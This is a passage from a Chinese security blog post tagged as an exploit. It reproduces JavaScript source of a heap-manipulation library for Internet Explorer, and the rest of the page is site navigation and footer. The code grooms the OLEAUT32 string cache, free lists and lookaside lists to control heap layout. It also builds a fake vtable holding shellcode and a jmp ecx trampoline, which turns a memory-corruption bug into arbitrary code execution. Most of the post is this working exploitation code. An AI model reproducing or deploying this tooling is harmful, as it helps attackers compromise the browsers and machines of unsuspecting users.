+// Allocates a block of a specified size with the OLEAUT32 alloc function. <br />
+// <br />
+// Arguments: <br />
+//&nbsp;&nbsp;&nbsp; arg - size of the new block in bytes, or a string to strdup <br />
+//&nbsp;&nbsp;&nbsp; tag - a tag identifying the memory block (optional) <br />
+//</P>
+<P>heapLib.ie.prototype.allocOleaut32 = function(arg, tag) {</P>
+<P>&nbsp;&nbsp;&nbsp; var size;</P>
+<P>&nbsp;&nbsp;&nbsp; // Calculate the allocation size <br />
+&nbsp;&nbsp;&nbsp; if (typeof arg == "string" || arg instanceof String) <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; size = 4 + arg.length*2 + 2;&nbsp;&nbsp;&nbsp; // len + string data + null terminator <br />
+&nbsp;&nbsp;&nbsp; else <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; size = arg;</P>
+<P>&nbsp;&nbsp;&nbsp; // Make sure that the size is valid <br />
+&nbsp;&nbsp;&nbsp; if ((size &amp; 0xf) != 0) <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; throw "Allocation size " + size + " must be a multiple of 16";</P>
+<P>&nbsp;&nbsp;&nbsp; // Create an array for this tag if doesn't already exist <br />
+&nbsp;&nbsp;&nbsp; if (this.mem[tag] === undefined) <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.mem[tag] = new Array();</P>
+<P>&nbsp;&nbsp;&nbsp; if (typeof arg == "string" || arg instanceof String) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Allocate a new block with strdup of the string argument <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.mem[tag].push(arg.substr(0, arg.length)); <br />
+&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp; else { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Allocate the block <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.mem[tag].push(this.padding((arg-6)/2)); <br />
+&nbsp;&nbsp;&nbsp; } <br />
+}</P>
+<P> <br />
+// <br />
+// Frees all memory blocks marked with a specific tag with the OLEAUT32 memory <br />
+// allocator. <br />
+// <br />
+// Arguments: <br />
+//&nbsp;&nbsp;&nbsp; tag - a tag identifying the group of blocks to be freed <br />
+//</P>
+<P>heapLib.ie.prototype.freeOleaut32 = function(tag) {</P>
+<P>&nbsp;&nbsp;&nbsp; delete this.mem[tag]; <br />
+&nbsp;&nbsp;&nbsp;  <br />
+&nbsp;&nbsp;&nbsp; // Run the garbage collector <br />
+&nbsp;&nbsp;&nbsp; CollectGarbage(); <br />
+}</P>
+<P> <br />
+// <br />
+// The JScript interpreter uses the OLEAUT32 memory allocator for all string <br />
+// allocations. This allocator stores freed blocks in a cache and reuses them <br />
+// for later allocations. The cache consists of 4 bins, each storing up to 6 <br />
+// blocks. Each bin holds blocks of a certain size range: <br />
+// <br />
+//&nbsp;&nbsp;&nbsp; 0 - 32 <br />
+//&nbsp;&nbsp;&nbsp; 33 - 64 <br />
+//&nbsp;&nbsp;&nbsp; 65 - 256 <br />
+//&nbsp;&nbsp;&nbsp; 257 - 32768 <br />
+// <br />
+// When a block is freed by the OLEAUT32 free function, it is stored in one of <br />
+// the bins. If the bin is full, the smallest block in the bin is freed with <br />
+// RtlFreeHeap() and is replaced with the new block. Chunks larger than 32768 <br />
+// bytes are not cached and are freed directly. <br />
+// <br />
+// To flush the cache, we need to free 6 blocks of the maximum size for each <br />
+// bin. The maximum size blocks will push out all smaller blocks from the <br />
+// cache. Then we allocate the maximum size blocks again, leaving the cache <br />
+// empty. <br />
+// <br />
+// You need to call this function once to allocate the maximum size blocks <br />
+// before you can use it to flush the cache. <br />
+//</P>
+<P>heapLib.ie.prototype.flushOleaut32 = function() {</P>
+<P>&nbsp;&nbsp;&nbsp; this.debug("Flushing the OLEAUT32 cache");</P>
+<P>&nbsp;&nbsp;&nbsp; // Free the maximum size blocks and push out all smaller blocks</P>
+<P>&nbsp;&nbsp;&nbsp; this.freeOleaut32("oleaut32"); <br />
+&nbsp;&nbsp;&nbsp;  <br />
+&nbsp;&nbsp;&nbsp; // Allocate the maximum sized blocks again, emptying the cache</P>
+<P>&nbsp;&nbsp;&nbsp; for (var i = 0; i &lt; 6; i++) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.allocOleaut32(32, "oleaut32"); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.allocOleaut32(64, "oleaut32"); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.allocOleaut32(256, "oleaut32"); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.allocOleaut32(32768, "oleaut32"); <br />
+&nbsp;&nbsp;&nbsp; } <br />
+}</P>
+<P> <br />
+// <br />
+// Allocates a block of a specified size with the system memory allocator. A <br />
+// call to this function is equivalent to a call to HeapAlloc(). If the first <br />
+// argument is a number, it specifies the size of the new block, which is <br />
+// filled with "A" characters. If the argument is a string, its data is copied <br />
+// into a new block of size arg.length * 2 + 6. In both cases the size of the <br />
+// new block must be a multiple of 16 and not equal to 32, 64, 256 or 32768. <br />
+// <br />
+// Arguments: <br />
+//&nbsp;&nbsp;&nbsp; arg - size of the memory block in bytes, or a string to strdup <br />
+//&nbsp;&nbsp;&nbsp; tag - a tag identifying the memory block (optional) <br />
+//</P>
+<P>heapLib.ie.prototype.alloc = function(arg, tag) {</P>
+<P>&nbsp;&nbsp;&nbsp; var size;</P>
+<P>&nbsp;&nbsp;&nbsp; // Calculate the allocation size <br />
+&nbsp;&nbsp;&nbsp; if (typeof arg == "string" || arg instanceof String) <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; size = 4 + arg.length*2 + 2;&nbsp;&nbsp;&nbsp; // len + string data + null terminator <br />
+&nbsp;&nbsp;&nbsp; else <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; size = arg;</P>
+<P>&nbsp;&nbsp;&nbsp; // Make sure that the size is valid <br />
+&nbsp;&nbsp;&nbsp; if (size == 32 || size == 64 || size == 256 || size == 32768) <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";</P>
+<P>&nbsp;&nbsp;&nbsp; // Allocate the block with the OLEAUT32 allocator <br />
+&nbsp;&nbsp;&nbsp; this.allocOleaut32(arg, tag); <br />
+}</P>
+<P> <br />
+// <br />
+// Frees all memory blocks marked with a specific tag with the system memory <br />
+// allocator. A call to this function is equivalent to a call to HeapFree(). <br />
+// <br />
+// Arguments: <br />
+//&nbsp;&nbsp;&nbsp; tag - a tag identifying the group of blocks to be freed <br />
+//</P>
+<P>heapLib.ie.prototype.free = function(tag) {</P>
+<P>&nbsp;&nbsp;&nbsp; // Free the blocks with the OLEAUT32 free function <br />
+&nbsp;&nbsp;&nbsp; this.freeOleaut32(tag);</P>
+<P>&nbsp;&nbsp;&nbsp; // Flush the OLEAUT32 cache <br />
+&nbsp;&nbsp;&nbsp; this.flushOleaut32(); <br />
+}</P>
+<P> <br />
+// <br />
+// Runs the garbage collector and flushes the OLEAUT32 cache. Call this <br />
+// function before before using alloc() and free(). <br />
+//</P>
+<P>heapLib.ie.prototype.gc = function() {</P>
+<P>&nbsp;&nbsp;&nbsp; this.debug("Running the garbage collector"); <br />
+&nbsp;&nbsp;&nbsp; CollectGarbage();</P>
+<P>&nbsp;&nbsp;&nbsp; this.flushOleaut32(); <br />
+}</P>
+<P> <br />
+// <br />
+// Adds blocks of the specified size to the free list and makes sure they are <br />
+// not coalesced. The heap must be defragmented before calling this function. <br />
+// If the size of the memory blocks is less than 1024, you have to make sure <br />
+// that the lookaside is full. <br />
+// <br />
+// Arguments: <br />
+//&nbsp;&nbsp;&nbsp; arg&nbsp;&nbsp;&nbsp; - size of the new block in bytes, or a string to strdup <br />
+//&nbsp;&nbsp;&nbsp; count&nbsp; - how many free blocks to add to the list (defaults to 1) <br />
+//</P>
+<P>heapLib.ie.prototype.freeList = function(arg, count) {</P>
+<P>&nbsp;&nbsp;&nbsp; var count = (count ? count : 1);</P>
+<P>&nbsp;&nbsp;&nbsp; for (var i = 0; i &lt; count; i++) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.alloc(arg); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.alloc(arg, "freeList"); <br />
+&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp; this.alloc(arg);</P>
+<P>&nbsp;&nbsp;&nbsp; this.free("freeList"); <br />
+}</P>
+<P> <br />
+// <br />
+// Add blocks of the specified size to the lookaside. The lookaside must be <br />
+// empty before calling this function. <br />
+// <br />
+// Arguments: <br />
+//&nbsp;&nbsp;&nbsp; arg&nbsp;&nbsp;&nbsp; - size of the new block in bytes, or a string to strdup <br />
+//&nbsp;&nbsp;&nbsp; count&nbsp; - how many blocks to add to the lookaside (defaults to 1) <br />
+//</P>
+<P>heapLib.ie.prototype.lookaside = function(arg, count) {</P>
+<P>&nbsp;&nbsp;&nbsp; var size;</P>
+<P>&nbsp;&nbsp;&nbsp; // Calculate the allocation size <br />
+&nbsp;&nbsp;&nbsp; if (typeof arg == "string" || arg instanceof String) <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; size = 4 + arg.length*2 + 2;&nbsp;&nbsp;&nbsp; // len + string data + null terminator <br />
+&nbsp;&nbsp;&nbsp; else <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; size = arg;</P>
+<P>&nbsp;&nbsp;&nbsp; // Make sure that the size is valid <br />
+&nbsp;&nbsp;&nbsp; if ((size &amp; 0xf) != 0) <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; throw "Allocation size " + size + " must be a multiple of 16";</P>
+<P>&nbsp;&nbsp;&nbsp; if (size+8 &gt;= 1024) <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; throw("Maximum lookaside block size is 1008 bytes");</P>
+<P>&nbsp;&nbsp;&nbsp; var count = (count ? count : 1);</P>
+<P>&nbsp;&nbsp;&nbsp; for (var i = 0; i &lt; count; i++) <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.alloc(arg, "lookaside");</P>
+<P>&nbsp;&nbsp;&nbsp; this.free("lookaside"); <br />
+}</P>
+<P> <br />
+// <br />
+// Return the address of the head of the lookaside linked list for blocks of a <br />
+// specified size. Uses the heapBase parameter from the heapLib.ie constructor. <br />
+// <br />
+// Arguments: <br />
+//&nbsp;&nbsp;&nbsp; arg - size of the new block in bytes, or a string to strdup <br />
+//</P>
+<P>heapLib.ie.prototype.lookasideAddr = function(arg) <br />
+{ <br />
+&nbsp;&nbsp;&nbsp; var size;</P>
+<P>&nbsp;&nbsp;&nbsp; // Calculate the allocation size <br />
+&nbsp;&nbsp;&nbsp; if (typeof arg == "string" || arg instanceof String) <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; size = 4 + arg.length*2 + 2;&nbsp;&nbsp;&nbsp; // len + string data + null terminator <br />
+&nbsp;&nbsp;&nbsp; else <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; size = arg;</P>
+<P>&nbsp;&nbsp;&nbsp; // Make sure that the size is valid <br />
+&nbsp;&nbsp;&nbsp; if ((size &amp; 0xf) != 0) <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; throw "Allocation size " + size + " must be a multiple of 16";</P>
+<P>&nbsp;&nbsp;&nbsp; if (size+8 &gt;= 1024) <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; throw("Maximum lookaside block size is 1008 bytes");</P>
+<P>&nbsp;&nbsp;&nbsp; // The lookahead array starts at heapBase + 0x688. It contains a 48 byte <br />
+&nbsp;&nbsp;&nbsp; // structure for each block size + header size in 8 byte increments.</P>
+<P>&nbsp;&nbsp;&nbsp; return this.heapBase + 0x688 + ((size+8)/8)*48; <br />
+}</P>
+<P> <br />
+// <br />
+// Returns a fake vtable that contains shellcode. The caller should free the <br />
+// vtable to the lookaside and use the address of the lookaside head as an <br />
+// object pointer. When the vtable is used, the address of the object must be <br />
+// in eax and the pointer to the vtable must be in ecx. Any virtual function <br />
+// call through the vtable from ecx+8 to ecx+0x80 will result in shellcode <br />
+// execution. This function uses the heap. <br />
+// <br />
+// Arguments: <br />
+//&nbsp;&nbsp;&nbsp; shellcode - shellcode string <br />
+//&nbsp;&nbsp;&nbsp; jmpecx&nbsp;&nbsp;&nbsp; - address of a jmp ecx or equivalent instruction <br />
+//&nbsp;&nbsp;&nbsp; size&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - size of the vtable to generate (defaults to 1008 bytes) <br />
+//</P>
+<P>heapLib.ie.prototype.vtable = function(shellcode, jmpecx, size) {</P>
+<P>&nbsp;&nbsp;&nbsp; var size = (size ? size : 1008);</P>
+<P>&nbsp;&nbsp;&nbsp; // Make sure the size is valid <br />
+&nbsp;&nbsp;&nbsp; if ((size &amp; 0xf) != 0) <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; throw "Vtable size " + size + " must be a multiple of 16";</P>
+<P>&nbsp;&nbsp;&nbsp; if (shellcode.length*2 &gt; size-138) <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; throw("Maximum shellcode length is " + (size-138) + " bytes");</P>
+<P>&nbsp;&nbsp;&nbsp; // Build the fake vtable that will go on the lookaside list <br />
+&nbsp;&nbsp;&nbsp; // <br />
+&nbsp;&nbsp;&nbsp; // lookaside ptr&nbsp; jmp +124&nbsp; addr of jmp ecx&nbsp; sub [eax], al*2&nbsp; shellcode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; null <br />
+&nbsp;&nbsp;&nbsp; // 4 bytes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4 bytes&nbsp;&nbsp; 124 bytes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4 bytes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; size-138 bytes&nbsp; 2 bytes</P>
+<P>&nbsp;&nbsp;&nbsp; var vtable = unescape("%u9090%u7ceb")&nbsp;&nbsp; // nop, nop, jmp + 124</P>
+<P>&nbsp;&nbsp;&nbsp; for (var i = 0; i &lt; 124/4; i++) <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; vtable += this.addr(jmpecx);</P>
+<P>&nbsp;&nbsp;&nbsp; // If the vtable is the only entry on the lookaside, the first 4 bytes will <br />
+&nbsp;&nbsp;&nbsp; // be 00 00 00 00, which disassembles as two add [eax], al instructions. <br />
+&nbsp;&nbsp;&nbsp; // The jmp ecx trampoline will jump back to the beginning of the vtable and <br />
+&nbsp;&nbsp;&nbsp; // execute the add [eax], al instructions. We need to use two sub [eax], al <br />
+&nbsp;&nbsp;&nbsp; // instructions to fix the heap.</P>
+<P>&nbsp;&nbsp;&nbsp; vtable += unescape("%u0028%u0028") +&nbsp;&nbsp;&nbsp; // two sub [eax], al instructions <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; shellcode + heap.padding((size-138)/2 - shellcode.length);</P>
+<P>&nbsp;&nbsp;&nbsp; return vtable; <br />
+}</P></TD></TR></TBODY></TABLE></P>
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">Nuclear'Atk</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+      2011-01-14
+      
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a href="https://lcx.cc/" target="_blank">Nuclear'Atk（核攻击）网络安全实验室</a>版权所有，转载请注明出处。</span>
+  </p>
+</div>
+
+
+    
+    
+
+    <footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://lcx.cc/tags/exp/">EXP</a>
+          <a href="https://lcx.cc/tags/html/">Html</a>
+          <a href="https://lcx.cc/tags/%E6%BA%A2%E5%87%BA/">溢出</a>
+          <a href="https://lcx.cc/tags/%E6%BA%90%E7%A0%81/">源码</a>
+          <a href="https://lcx.cc/tags/app/">app</a>
+          <a href="https://lcx.cc/tags/asp/">ASP</a>
+          <a href="https://lcx.cc/tags/bug/">bug</a>
+          <a href="https://lcx.cc/tags/exe/">exe</a>
+          <a href="https://lcx.cc/tags/exploit/">Exploit</a>
+          <a href="https://lcx.cc/tags/http/">HTTP</a>
+          <a href="https://lcx.cc/tags/ie/">IE</a>
+          <a href="https://lcx.cc/tags/ip/">IP</a>
+          <a href="https://lcx.cc/tags/js/">js</a>
+          <a href="https://lcx.cc/tags/microsoft/">Microsoft</a>
+          <a href="https://lcx.cc/tags/nds/">NDS</a>
+          <a href="https://lcx.cc/tags/root/">Root</a>
+          <a href="https://lcx.cc/tags/seo/">SEO</a>
+          <a href="https://lcx.cc/tags/shell/">Shell</a>
+          <a href="https://lcx.cc/tags/url/">URL</a>
+          <a href="https://lcx.cc/tags/wiki/">Wiki</a>
+          
+        </div>
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/1092/">
+            
+            <i class="iconfont">
+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">Exp - MS10-073 Win32k Keyboard Layout</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+          <a class="next" href="/post/1090/">
+            <span class="next-text nav-default">Exp - 东方网景企业邮箱系统目录遍历漏洞</span>
+            <span class="prev-text nav-mobile">下一篇</span>
+            
+            <i class="iconfont">
+              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
+</svg>
+
+            </i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+
+  
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+    
+
+  
+
+        </div>
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="icon-links">
+  
+  
+    <a href="mailto:root@lcx.cc" rel="me noopener" class="iconfont"
+      title="email" >
+      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="linkedin"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="33" height="33">
+  <path d="M872.405333 872.618667h-151.637333v-237.610667c0-56.661333-1.152-129.578667-79.018667-129.578667-79.061333 0-91.136 61.653333-91.136 125.397334v241.792H398.976V384h145.664v66.602667h1.962667c20.352-38.4 69.845333-78.933333 143.786666-78.933334 153.642667 0 182.058667 101.12 182.058667 232.746667v268.202667zM227.712 317.141333a87.978667 87.978667 0 0 1-88.021333-88.106666 88.064 88.064 0 1 1 88.021333 88.106666z m76.032 555.477334H151.68V384h152.064v488.618667zM948.266667 0H75.562667C33.792 0 0 33.024 0 73.770667v876.458666C0 991.018667 33.792 1024 75.562667 1024h872.576C989.866667 1024 1024 991.018667 1024 950.229333V73.770667C1024 33.024 989.866667 0 948.138667 0h0.128z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="weibo"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M385.714286 733.714286q12-19.428571 6.285714-39.428571t-25.714286-28.571429q-19.428571-8-41.714286-0.571429t-34.285714 26.285714q-12.571429 19.428571-7.428571 39.142857t24.571429 28.857143 42.571429 1.428571 35.714286-27.142857zm53.714286-69.142857q4.571429-7.428571 2-15.142857t-10-10.571429q-8-2.857143-16.285714 2.857143t-12.285714 10.571429q-9.714286 17.714286 7.428571 25.714286 8 2.857143 16.571429 2.857143t12.571429-10.571429zm99.428571 61.142857q-25.714286 58.285714-90.285714 85.714286t-128 6.857143q-61.142857-19.428571-84.285714-72.285714t3.714286-107.142857q26.857143-53.142857 86.571429-79.428571t120.285714-10.857143q63.428571 16.571429 90.571429 68.285714t1.428571 108.857143zm178.285714-91.428571q-5.142857-54.857143-50.857143-97.142857t-119.142857-62.285714-156.857143-12q-127.428571 13.142857-211.142857 80.857143t-75.714286 151.142857q5.142857 54.857143 50.857143 97.142857t119.142857 62.285714 156.857143 12q127.428571-13.142857 211.142857-80.857143t75.714286-151.142857zm176 2.285714q0 38.857143-21.142857 79.714286t-62.285714 78.285714-96.285714 67.142857-129.142857 47.428571-154.571429 17.714286-157.142857-19.142857-137.428571-53.142857-98-86.285714-37.142857-114q0-65.714286 39.714286-140t112.857143-147.428571q96.571429-96.571429 195.142857-134.857143t140.857143 4q37.142857 36.571429 11.428571 119.428571-2.285714 8-0.571429 11.428571t5.714286 4 8.285714 2.857143 7.714286-2l3.428571-1.142857q79.428571-33.714286 140.571429-33.714286t87.428571 34.857143q25.714286 36 0 101.714286-1.142857 7.428571-2.571429 11.428571t2.571429 7.142857 6.857143 4.285714 9.714286 3.428571q32.571429 10.285714 58.857143 26.857143t45.714286 46.571429 19.428571 66.571429zm-42.285714-356.571429q24 26.857143 31.142857 62t-3.714286 67.142857q-4.571429 13.142857-16.857143 19.428571t-25.428571 2.285714q-13.142857-4.571429-19.428571-16.857143t-2.285714-25.428571q11.428571-36-13.714286-63.428571t-61.142857-20q-13.714286 2.857143-25.714286-4.571429t-14.285714-21.142857q-2.857143-13.714286 4.571429-25.428571t21.142857-14.571429q34.285714-7.428571 68 3.142857t57.714286 37.428571zm103.428571-93.142857q49.714286 54.857143 64.285714 127.142857t-7.714286 138q-5.142857 15.428571-19.428571 22.857143t-29.714286 2.285714-22.857143-19.428571-2.857143-29.714286q16-46.857143 5.714286-98.285714t-45.714286-90.285714q-35.428571-39.428571-84.571429-54.571429t-98.857143-4.857143q-16 3.428571-29.714286-5.428571t-17.142857-24.857143 5.428571-29.428571 24.857143-16.857143q70.285714-14.857143 139.428571 6.571429t118.857143 76.857143z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="zhihu"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
+  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="douban"  target="_blank"
+      >
+      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M926.917973 37.80608C959.65184 37.80608 986.19392 64.34816 986.19392 97.082027L986.19392 926.917973C986.19392 959.65184 959.65184 986.19392 926.917973 986.19392L97.082027 986.19392C64.34816 986.19392 37.80608 959.65184 37.80608 926.917973L37.80608 97.082027C37.80608 64.34816 64.34816 37.80608 97.082027 37.80608zM176.653653 176.19968 176.653653 252.678827 825.658027 252.678827 825.658027 176.19968zM217.719467 316.146347 217.719467 628.08064 273.524053 628.08064 341.292373 770.39616 157.259093 770.39616 157.259093 845.417813 842.949973 845.417813 842.949973 770.39616 654.226773 770.39616 722.899627 628.08064 783.67744 628.08064 783.67744 316.146347zM684.885333 392.891733 684.885333 553.987413 312.576 553.987413 312.576 392.891733zM570.770773 770.39616 426.653013 770.39616 359.621973 628.08064 639.443627 628.08064z"></path>
+</svg>
+
+    </a>
+
+
+<a href="https://lcx.cc/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
+    class="iconfont" title="rss" target="_blank">
+    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="30" height="30">
+  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
+</svg>
+
+  </a>
+   
+</div>
+
+<div class="copyright">
+
+  
+
+  <span class="copyright-year">
+    &copy;
+    
+      2010 -
+    2025
+    <span class="heart">
+      
+      <i class="iconfont">
+        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="14" height="14">
